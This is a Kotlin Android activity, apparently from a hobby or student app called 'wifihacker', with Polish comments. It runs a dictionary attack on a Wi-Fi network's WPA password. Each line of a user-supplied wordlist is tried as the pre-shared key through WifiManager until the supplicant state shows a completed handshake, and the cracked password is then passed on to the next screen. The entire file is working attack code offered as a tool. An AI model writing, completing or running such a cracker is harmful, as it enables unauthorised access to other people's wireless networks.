package com.example.wifihacker

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.PorterDuff
import android.net.Uri
import android.net.wifi.SupplicantState
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.Bundle
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.InputStream
import java.lang.Exception


class ActivityThird : AppCompatActivity() {

    var ssid = "aaa"
    lateinit var uri: Uri
    lateinit var inputStream: InputStream
    var correctPass = "correctPass"
    var count: Int = 0
    var status = false


    @SuppressLint("SetTextI18n")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_third)

        val i: Intent = getIntent()                        //odebranie ssid z  poprzedniego activity
        ssid = i.getExtras()?.getString("ssid").toString()
        uri = i.getParcelableExtra("uri")!!
        println("received "+ssid+" "+uri)

        inputStream = contentResolver.openInputStream(uri)!!

        //TODO JEST ODCZYT CALEGO PLIKU DO RAMU - ZLE GDY DUZE PLIKI
//        val lineList = mutableListOf<String>()
//        inputStream.bufferedReader().forEachLine {
//            lineList.add(it)
//        }

        val dalejButton: Button = findViewById(R.id.Dalej_button)
        dalejButton.visibility= View.GONE
        dalejButton.setOnClickListener {
            //przekazanie danych do activity4
            val intent = Intent(this, ActivityFourth::class.java)
            intent.putExtra("ssid",ssid)
            intent.putExtra("correctPass", correctPass)
            intent.putExtra("status",status)
            println("passed "+ssid+" "+correctPass+" "+status)
            startActivity(intent)
        }


        //watek lamiacy haslo do wifi
        Thread(Runnable {


            //dopoki sa hasla w pliku i nie zlamano hasla
//            while(count<lineList.size&&!status) {//TODO dopoki hasla sa na liscie - zamienic na odczytywanie tutaj
//            while(inputStream != null&&!status)
            try {
                inputStream.bufferedReader().forEachLine {
                    //val lineList = mutableListOf<String>()
//            if (inputStream != null) {

                    //lineList.add(it)
//                val pass: String = lineList[count]
                    val pass: String = it

                    if(pass.length>=8){
                        println(ssid + " " + pass)

                        val haslo_text: TextView = findViewById(R.id.aktualneHasloText)
                        runOnUiThread {
                            haslo_text.text = pass
                        }
                        connectToWifi(ssid, pass)

                        if (status)
                            throw Exception("found")
//                    count++
                    }


                }
            } catch (e: Exception) {

            }

            runOnUiThread {
                dalejButton.visibility= View.VISIBLE
                val tekst_gorny: TextView = findViewById(R.id.LamanieHasla_text)
                tekst_gorny.visibility=View.GONE
                val haslo_text: TextView = findViewById(R.id.aktualneHasloText)
                haslo_text.visibility=View.GONE
                val status_text: TextView = findViewById(R.id.connectionStatusText)
                status_text.text="Proszę przejść dalej"

                val pbar: ProgressBar = findViewById(R.id.progressBar1)
                pbar.visibility=View.GONE
            }

//            //wylacza i wlacza wifi, zeby znikly bledne zapisy z listy sieci w ustawieniach
//            val wifiManager = this.applicationContext
//                .getSystemService(Context.WIFI_SERVICE) as WifiManager
//            wifiManager.isWifiEnabled = false
//            wifiManager.isWifiEnabled = true

        }).start()

    }


    fun connectToWifi(ssid: String, password: String) {
        val wifiConfig = WifiConfiguration()

        wifiConfig.SSID = String.format("\"%s\"", ssid)
        wifiConfig.preSharedKey = String.format("\"%s\"", password)

        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
//        wifiManager.isWifiEnabled = false
//        wifiManager.isWifiEnabled = true
        val netId = wifiManager.addNetwork(wifiConfig)
        wifiManager.disconnect()
        wifiManager.enableNetwork(netId, true)
        wifiManager.reconnect()

        val status_text: TextView = findViewById(R.id.connectionStatusText)

        runOnUiThread { status_text.text= wifiManager.connectionInfo.supplicantState.toString() }
//        while (true)  //debugowanie
//            println("----------" + wifiManager.connectionInfo.supplicantState)

        while (wifiManager.connectionInfo.supplicantState!=SupplicantState.ASSOCIATING) {
//            println("----------" + wifiManager.connectionInfo.supplicantState)
//            println("waiting for ASSOCIATING")

        }

        while (wifiManager.connectionInfo.supplicantState!=SupplicantState.FOUR_WAY_HANDSHAKE) {
//            println("----------" + wifiManager.connectionInfo.supplicantState)
//            println("waiting for FOUR_WAY_HANDSHAKE")

        }
        runOnUiThread { status_text.text= wifiManager.connectionInfo.supplicantState.toString() }
        while(wifiManager.connectionInfo.supplicantState==SupplicantState.FOUR_WAY_HANDSHAKE) {
//            println("----------" + wifiManager.connectionInfo.supplicantState)
//            println("waiting for GROUP_HANDSHAKE")

        }
        runOnUiThread { status_text.text= wifiManager.connectionInfo.supplicantState.toString() }


        if(wifiManager.connectionInfo.supplicantState==SupplicantState.DISCONNECTED){
//            println("----------"+wifiManager.connectionInfo.supplicantState)
            println("disconnected")
            runOnUiThread { status_text.text= wifiManager.connectionInfo.supplicantState.toString() }
            status=false
            return
        }

        while(wifiManager.connectionInfo.supplicantState!=SupplicantState.COMPLETED) {
//            println("----------" + wifiManager.connectionInfo.supplicantState)
//            println("waiting for COMPLETED")

        }

        if(wifiManager.connectionInfo.supplicantState==SupplicantState.COMPLETED){
//            println("----------"+wifiManager.connectionInfo.supplicantState)
            println("completed")
            runOnUiThread { status_text.text= wifiManager.connectionInfo.supplicantState.toString() }

            status=true
            correctPass=password
            return
        }
    }
}